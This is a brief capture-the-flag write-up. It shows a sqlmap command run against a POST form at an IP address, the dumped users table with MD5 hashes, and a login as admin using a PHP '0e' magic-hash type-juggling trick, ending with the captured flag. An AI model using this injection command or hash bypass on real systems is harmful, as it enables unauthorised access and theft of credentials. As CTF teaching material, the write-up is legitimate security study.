SQL injection

I used sqlmap to get the data:

```
http://163.172.176.29/WALL/index.php (POST)  # /usr/bin/sqlmap -u http://163.172.176.29/WALL/index.php --data=life=JonSnow&soul=234 --user-agent=random --threads=10 -T users -C password,role,username --dump


Database: SQLite_masterdb
Table: users
[3 entries]
+----+----------------------------------+--------+---------------+
| id | password                         | role   | username      |
+----+----------------------------------+--------+---------------+
| 1  | 8bed707bb9c0a948fa0c465495fc8014 | normal | JonSnow       |
| 2  | 0e565041023046045310587974628079 | admin  | LordCommander |
| 3  | 6a1def57895118aed6fd730d0dd84ce3 | normal | Targaryen     |
+----+----------------------------------+--------+---------------+

```

Notice that the hash started with '0e' and in the sourcecode we could see that the strings were matched with '==' so I used 'LordCommander:QNKCDZO' to login and got the flag: CTF{type_juggling_and_blind_sql_are_worth_a_fun_240610708}

How could I login with 'QNKCDZO', read this post @ stackoverflow: https://stackoverflow.com/questions/22140204/why-md5240610708-is-equal-to-md5qnkcdzo



